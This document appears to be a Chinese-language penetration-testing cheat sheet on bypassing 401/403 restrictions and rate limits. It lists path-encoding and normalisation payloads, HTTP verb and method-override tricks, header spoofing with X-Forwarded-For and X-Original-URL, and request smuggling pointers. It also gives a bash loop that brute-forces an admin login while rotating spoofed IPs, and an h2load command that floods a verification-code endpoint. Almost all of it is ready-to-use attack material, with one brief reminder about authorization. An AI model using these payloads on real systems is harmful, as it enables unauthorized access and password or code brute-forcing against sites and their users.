# 401/403 路径 · 动词 · 头 全矩阵 + 限流绕过

> 原理: 反向代理/WAF 检查一种写法,**后端归一化成另一种**。
> 纪律: **一次只改一个变量**,记录每个变体的 status + 长度,不要一次叠三个变形(无法归因)。

## 1. 路径变形矩阵

假设 `/admin` → 403。逐个替换(每次只试一个):

```
# 1.1 尾斜杠 / 尾点
/admin/          /admin/.        /admin//

# 1.2 大小写(Windows/IIS 必试)
/Admin  /ADMIN  /aDmIn  /AdMiN

# 1.3 URL 编码
/%61dmin   /admi%6e   /%61%64%6d%69%6e   /%2fadmin

# 1.4 双重编码(%25 = %)
/%2561dmin   /admin%252f   /admin..%252f

# 1.5 畸形 / 超长 UTF-8
/admi%C0%AE   /admi%C0%6E   /%C0%AFadmin

# 1.6 点段
/./admin   //admin   /admin/./   /.//admin   /foo/../admin

# 1.7 Tomcat / Java path parameter(Java 站必试)
/admin..;/   /admin;foo=bar   /admin;   /admin;x

# 1.8 空字节
/admin%00   /admin%00.json   /%00/admin

# 1.9 尾随特殊字符
/admin%20   /admin%09   /admin?   /admin.json   /admin.html   /admin/~

# 1.10 反斜杠(Windows/IIS)
/admin\   /admin\..\/   \.\.\admin
```

**判据**: 403 → 200/302/401 即绕过成立;403→403 但**长度变了**说明命中了不同分支(值得继续)。

### 关键组合(单变形不通时)
```
/admin/..;/admin/        ← 归一化 + path param
/%2fadmin/..%2f          ← 双重编码 + 点段
/admin%252f..%252fadmin  ← 双编码穿透次数不同的反代
```

### nginx 的特殊性(止损点)
nginx 在**位置匹配之前**就完成解码与归一化 → `%2e` `//` `/./` `..%2f` 全部无效。
判断规则形状的两次请求:
- `/.gitignore` → **403** ⇒ 规则是前缀式 `^/\.git`
- `/.git/HEAD.`(结尾加点)→ **404** ⇒ 规则形如 `^/\.git[^.]*$`,`.git` 后出现 `.` 就放行
上例只放行 `*.sample` / `*.pack` / `*.idx`(SHA1 名不可猜)→ **立刻停手,别继续试编码**。

## 2. 动词篡改 + 方法覆盖

```http
# 原: DELETE /api/admin/user/1 → 403(鉴权挂在这个动词上)
HEAD    /api/admin/user/1          ← 与 GET 同语义但常不触发鉴权
OPTIONS /api/admin/user/1          ← CORS 预检路径常被配成放行
GET     /api/admin/user/1
PUT     /api/admin/user/1
PATCH   /api/admin/user/1
TRACE   /api/admin/user/1          ← 可能回显 auth 头(XST)
```
```http
# 覆盖头(框架按它路由到 PUT handler,而鉴权只看外层动词)
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
X-HTTP-Method: PUT

# 表单隐藏字段(Laravel / Spring 的 _method)
POST /api/x  body: _method=PUT&...
```
**实证**: GoogleCloudPlatform esp-v2 的 JWT 认证可被 `X-HTTP-Method-Override` 绕过(GHSA-6qmp-9p95-fc5f)。
底层的"HEAD 绕过 DELETE 守卫"是同一类缺陷: **守卫按动词注册,handler 收全部动词**。

## 3. 请求头绕过

```http
# 3.1 重写路径(反代按头路由,后端按真实 URL)
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Prefix: /admin

# 3.2 IP / 来源伪造(只做白名单或按它记账)
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
# 内网段同样有效
X-Forwarded-For: 192.168.1.1   /   10.0.0.1   /   172.16.0.1

# 3.3 Host / 来源
Host: localhost
X-Forwarded-Host: localhost
X-Host: localhost
X-Forwarded-Server: localhost
Referer: https://T/admin
Origin: https://T

# 3.4 内容协商 / 客户端标记
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json
```
OWASP WSTG 列的同族头: `X-Forwarded-For` `X-Forward-For` `X-Remote-IP` `X-Originating-IP`
`X-Remote-Addr` `X-Client-IP`;值用 `127.0.0.1` / `localhost` / 任意 RFC1918。

## 4. 协议层

```http
# 4.1 协议降级(部分 ACL 只对 HTTP/1.1 生效)
GET /admin HTTP/1.0

# 4.2 HTTP/2 明文(h2c)走私 → 绕过代理 ACL
# 4.3 请求走私(CL.TE / TE.CL / TE.TE / h2c)→ 彻底绕过前置 ACL
```
详见 `http-smuggling-protocol-abuse`。

## 5. 限流 / 锁定绕过(把"锁定"这个障碍拿掉)

**核心原理**: 限流键取自客户端可控的头 → 每个请求换一个值 = 无限次尝试。

```bash
# 5.1 换 XFF(最常见的错误实现:取最左值当客户端 IP)
for i in $(seq 1 200); do
  curl -s -X POST https://T/api/login \
    -H "X-Forwarded-For: 10.0.$((i/250)).$((i%250+1))" \
    -d "username=admin&password=guess$i" -o /dev/null -w '%{http_code} '
done
```
```text
# 5.2 其它换键维度
X-Real-IP / X-Client-IP / X-Originating-IP 轮换
用户名大小写 / 前后空格(键按用户名字符串而非账号 ID 时)
注册邮箱的 +alias / 点号变体(键按邮箱原串时)
丢弃 Cookie → 新 session
参数变体(同一账号用不同字段名提交)
```
```bash
# 5.3 HTTP/2 复用单连接并发(部分实现只对"新连接"计数)
printf '%s\n' '{"code":"000000"}' > post.json
h2load -n 100 -c 1 -m 100 -d post.json \
  -H 'content-type: application/json' https://T/api/v2/verify
```
**实证**: CVE-2026-84476(AVideo 信任 X-Real-IP/XFF)、CVE-2026-27981(Homebox 认证限流绕过)、
自研平台按其 `get_client_ip()` 取 XFF **最左值**做限流键(CWE-345)。

⚠️ **声明纪律**: 用限流绕过把尝试数从 5 提到 2000 = 实质上是在跑爆破。
必须先告知目标/授权边界,并保持低频可停。

## 6. 自动化

| 工具 | 用途 |
|---|---|
| `403bypasser` (sting8k) | 头 / 路径 / 动词 组合自动跑 |
| `dirsearch` (maurosoria) | 带编码变体的目录爆破 |
| `feroxbuster` | 递归内容发现 |
| Burp `Autorize` | 双会话越权矩阵(把低权 session 注入每个请求,自动标红) |
| Burp `Match & Replace` | 客户端布尔标志翻转;统一注入 XFF |
| SecLists `raft-large-directories` + **大写变体表** | 纯小写表会漏 `/Admin` `/API` `/CHANGELOG` |
| ffuf `-ac` | 自动校准过滤(等价于基线法) |
| `gobuster dir` | 基础目录枚举;先用 `/robots.txt` `/sitemap.xml` 缩小范围 |
